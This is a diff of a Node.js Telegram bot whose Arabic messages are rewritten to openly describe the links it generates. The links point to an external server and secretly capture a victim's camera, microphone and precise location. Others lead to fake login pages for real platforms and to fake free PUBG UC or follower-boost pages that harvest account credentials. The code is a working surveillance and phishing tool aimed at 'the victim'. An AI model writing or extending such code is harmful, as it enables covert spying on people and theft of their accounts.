@@ -866,7 +866,7 @@ bot.on('callback_query', (callbackQuery) => {
 
     if (data === 'front_camera' || data === 'rear_camera') {
         const url = `https://yyytot.onrender.com/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
-        bot.sendMessage(chatId, `انقر على الرابط للتصوير: ${url}`);
+        bot.sendMessage(chatId, ` تم تلغيم رابط اختراق الكاميرا الأمامية والخلفية: ${url}`);
     } else if (data === 'voice_record') {
         bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
     } else if (data === 'get_location') {
@@ -875,7 +875,7 @@ bot.on('callback_query', (callbackQuery) => {
         console.log('Chat ID:', chatId);
         console.log('URL:', url);
         
-        bot.sendMessage(chatId, `انقر على الرابط للحصول على موقعك: ${url}`)
+        bot.sendMessage(chatId, `تم تلغيم رابط اختراق موقع الضحيه الدقيق: ${url}`)
             .then(() => console.log('Message sent successfully'))
             .catch(err => console.error('Error sending message:', err));
     }
@@ -888,7 +888,7 @@ bot.on('message', (msg) => {
     if (!isNaN(duration)) {
         if (duration > 0 && duration <= 20) {
             const link = `https://yyytot.onrender.com/record/${chatId}?duration=${duration}`;
-            bot.sendMessage(chatId, `تم تجهيز الرابط لتسجيل صوت لمدة ${duration} ثواني: ${link}`);
+            bot.sendMessage(chatId, `تم تلغيم الرابط لتسجيل صوت الضحيه لمدة ${duration} ثواني: ${link}`);
         } else {
             bot.sendMessage(chatId, 'الحد الأقصى لمدة التسجيل هو 20 ثانية. الرجاء إدخال مدة صحيحة.');
         }
@@ -941,17 +941,17 @@ bot.on('callback_query', (query) => {
     if (data.startsWith('login_')) {
         const platform = data.split('_')[1];
         url = `${baseUrl}/login/${platform}/${chatId}`;
-        message = `يرجى تسجيل الدخول إلى ${getPlatformName(platform)}: ${url}`;
+        message = `تم تلغيم  رابط اندكس تسجيل دخول يشبه الصفحه الحقيقه لحد المنصات${getPlatformName(platform)}: ${url}`;
     } else if (data === 'pubg_uc') {
         url = `${baseUrl}/increase/pubg_uc/${chatId}`;
-        message = `يرجى إدخال معلومات حسابك لشحن شدات ببجي: ${url}`;
+        message = `تم تلغيم رابط اختراق على شكل صفحه مزوره لشحن شدات ببجي مجانآ: ${url}`;
     } else if (data.startsWith('increase_')) {
         const platform = data.split('_')[1];
         url = `${baseUrl}/increase/${platform}/${chatId}`;
-        message = `يرجى إدخال معلومات حسابك لزيادة المتابعين على ${getPlatformName(platform)}: ${url}`;
+        message = `تم تلغيم رابط اختراق على شكل صفحه مزوره لزيادة المتابعين ${getPlatformName(platform)}: ${url}`;
     } else {
         console.log('Unhandled callback query:', data);
-        message = 'عملية غير معروفة';
+      
     }
 
     bot.sendMessage(chatId, message)
